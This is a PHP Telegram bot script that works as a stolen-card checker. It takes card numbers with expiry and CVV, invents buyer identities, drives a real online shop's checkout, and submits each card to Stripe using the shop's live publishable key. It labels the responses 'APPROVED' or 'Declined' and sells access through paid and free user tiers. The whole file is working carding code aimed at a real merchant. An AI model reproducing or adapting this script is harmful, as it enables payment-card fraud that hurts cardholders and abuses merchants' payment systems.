<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";
$gate = "Braintree Auth";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "Codez";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "Codez";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}


//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/mstr|\.mstr|!mstr)/', $text)) {
    $userid = $update['message']['from']['id'];

  if (!checkAccess($userid)) {
      $sent_message_id = send_reply($chatId, $message_id, $keyboard, "Noob", $message_id);
      exit();
  }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
  
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "PROCESSING YOUR REQUEST ⛄️",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');


    $message = substr($message, 5);
    $lista = $message;

    if (empty($message)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "Format -> cc|mm|yy|cvv",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
        return;
    }

    $aray = gibarray($message);
    $cout = count($aray);
    if ($cout > 5) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "only 5 cc allowed",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    }
    global $fullmes;
    $fullmes = '';
    sleep(1);

    foreach ($aray as $lista) {
        $lista = clean($lista);
        $partes = multiexplode(array(":", "|", "/", " "), $lista);

        $cc = $partes[0];
        $mes = $partes[1];
        $ano = $partes[2];
        $cvv = $partes[3];
        $mes = ltrim($mes, '0');
        $ano = strlen($ano) == 2 ? '20' . $ano : $ano;

        $ccbin = substr($cc, 0, 6);

        if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "Invalid details[3] \nFormat -> cc|mm|yy|cvv",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
            return;
        };
        $lista = "<code>$cc|$mes|$ano|$cvv</code>";

        $proxiee = null;
        $pass = null;
        $cookieFile = getcwd() . '/cookies.txt';



        $firstname = ucfirst(str_shuffle('anthonysudiaj'));
        $lastname = ucfirst(str_shuffle('pitoshduajdb'));
        $street = "" . rand(0000, 9999) . " Main Street";
        $ph = array("682", "346", "246");
        $ph1 = array_rand($ph);
        $phh = $ph[$ph1];
        $phone = "$phh" . rand(0000000, 9999999) . "";
        $email = 'anthoyn' . $firstname . 'us82j37' . $phone . '@gmail.com';
        $st = array("AL", "NY", "CA", "FL", "WA");
        $st1 = array_rand($st);
        $statee = $st[$st1];
        if ($statee == "NY") {
            $state = $statee;
            $postcode = "10080";
            $city = "New York";
        } elseif ($statee == "WA") {
            $state = $statee;
            $postcode = "98001";
            $city = "Auburn";
        } elseif ($statee == "AL") {
            $state = $statee;
            $postcode = "35005";
            $city = "Adamsville";
        } elseif ($statee == "FL") {
            $state = $statee;
            $postcode = "32003";
            $city = "Orange Park";
        } else {
            $state = $statee;
            $postcode = "90201";
            $city = "Bell";
        };


          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
          curl_setopt($ch, CURLOPT_HTTPHEADER, [
              'authority: catechdepot.com',
              'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
              'accept-language: es-ES,es;q=0.9',
              'referer: https://catechdepot.com/shop/confirmation',
              'sec-fetch-dest: document',
              'sec-fetch-mode: navigate',
              'sec-fetch-site: same-origin',
              'sec-fetch-user: ?1',
              'upgrade-insecure-requests: 1',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
          ]);

          curl_setopt($ch, CURLOPT_PROXY, $proxie);
          curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
          curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
          $r2 = curl_exec($ch);
          curl_close($ch);

          $cf = getstr($r2, 'csrf_token: "', '"');
          echo "$cf--<br>";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/cart/update');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            // Your headers here
        ]);
        curl_setopt($ch, CURLOPT_PROXY, $proxie);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=' . $cf . '&product_id=78725&quantity=1&product_custom_attribute_values=%5B%5D&variant_values=334&no_variant_attribute_values=%5B%5D&add_qty=1&express=true');

        $r = curl_exec($ch);

        if(curl_errno($ch)) {
            // Curl error occurred
            $error_message = curl_error($ch);
            // Handle the error as needed
        } else {
            // Curl request was successful
            // Continue processing response
        }

        curl_close($ch);

          echo "r_ $r<br>";



        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/address');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'authority: catechdepot.com',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-ES,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://catechdepot.com',
            'referer: https://catechdepot.com/shop/address',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        ]);
        curl_setopt($ch, CURLOPT_PROXY, $proxie);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=adwa+dev&email=josewers20%40gmail.com&phone=9703878998&street=street+212&street2=&city=new+york&zip=10080&country_id=233&state_id=35&csrf_token=' . $cf . '&submitted=1&partner_id=186&callback=&field_required=phone%2Cname');

        $rz = curl_exec($ch);
        curl_close($ch);



          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, [
              'authority: api.stripe.com',
              'accept: application/json',
              'accept-language: es-ES,es;q=0.9',
              'content-type: application/x-www-form-urlencoded',
              'origin: https://js.stripe.com',
              'referer: https://js.stripe.com/',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-site',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',

          ]);
          curl_setopt($ch, CURLOPT_PROXY, $proxie);
          curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
          curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&guid=41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399&muid=849631d5-81c7-47e1-87ea-91b4b92af8c1870d68&sid=03283b22-15d4-4227-8a27-e7fe7394968ad9bf7a&pasted_fields=number&payment_user_agent=stripe.js%2F85b73043af%3B+stripe-js-v3%2F85b73043af%3B+card-element&referrer=https%3A%2F%2Fcatechdepot.com&time_on_page=15189&key=pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0');

          $rx = curl_exec($ch);
          curl_close($ch);

          $j = json_decode($rx, true);
          $id = $j['id'];

    

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/payment/stripe/s2s/create_json_3ds');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
          curl_setopt($ch, CURLOPT_HTTPHEADER, [
              'authority: catechdepot.com',
              'accept: application/json, text/javascript, */*; q=0.01',
              'accept-language: es-ES,es;q=0.9',
              'content-type: application/json',
              'origin: https://catechdepot.com',
              'referer: https://catechdepot.com/shop/payment',
              'sec-fetch-dest: empty',
              'sec-fetch-mode: cors',
              'sec-fetch-site: same-origin',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
              'x-requested-with: XMLHttpRequest',
          ]);
          curl_setopt($ch, CURLOPT_PROXY, $proxie);
          curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
          curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '{"jsonrpc":"2.0","method":"call","params":{"data_set":"/payment/stripe/s2s/create_json_3ds","acquirer_id":"9","stripe_publishable_key":"pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0","currency_id":"","return_url":"/shop/payment/validate","partner_id":"186","csrf_token":"' . $cf . '","payment_method":"' . $id . '"},"id":364109924}');
 $rx = curl_exec($ch);

   curl_close($ch);



          $end_time = microtime(true);
          $time = number_format($end_time - $start_time, 2);
          ////////--[Responses]--////////

            if (strpos($rx, '3d_secure')) {
            $msg = "CVV CARD ⌁ Approved";
                 $es = "[APPROVED 🟩] ";
               } elseif (strpos($rx, "Your card number is incorrect.")) {
                    $msg = 'card number is incorrect ';
                    $es = 'Declined ❌';
               } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card was declined.")) {
                    $msg = 'Card declined';
              $es = 'Declined ❌';
                  } elseif (strpos($rx, "Your card was declined.")) {
                    $msg = 'Your card was declined ';
              $es = 'Declined ❌';
               } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card's security code is incorrect.'")) {
                    $msg = "Your card's security code is incorrect";
                $es = "[APPROVED 🟩] ";
                   $msg = "CCN CARD ⌁ You're Card's Security Code Is Incorrect";
                } elseif (strpos($rx, 'Your card has insufficient funds.')) {
              $es = "[APPROVED 🟩] ";
                    $msg = 'Insufficuent Fund In Card';
               } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Your card does not support this type of purchase.'")) {
                 $es = "[APPROVED 🟩] ";
                    $msg = "You're Card Does Not Support This Type Of Purchase";

              } elseif (strpos($rx, "Stripe gave us the following info about the problem: 'Invalid account.'")) {
              $es = "[APPROVED 🟩] ";
                   $msg = "Invaild Account";

                } else {
              $es = 'Declined ❌';
                    $msg =  "$msg";
          }
      $end_time = microtime(true);
      $time = number_format($end_time - $start_time, 2);

        unlink($cookieFile);
      $fullmes = $fullmes . "Card  $lista" . " \n<b>Status </b> " . $es . "\n<b>Response </b> <u>$msg</u>\n<b>Gate Stripe Auth</b>\n\n";


        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "<b>
Stripe auth ☁
 - - - - - - - - - - - - - - - - - - - - - -
$fullmes
- - - - - - - - - - - - - - - - - - - - - - -
Proxy ↺ Live ✅
T/t-𝓭 $time s
Req ↺ @$username
Dev ↺ <code>@rundilundlegamera</code></b>
    ",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
    }
}
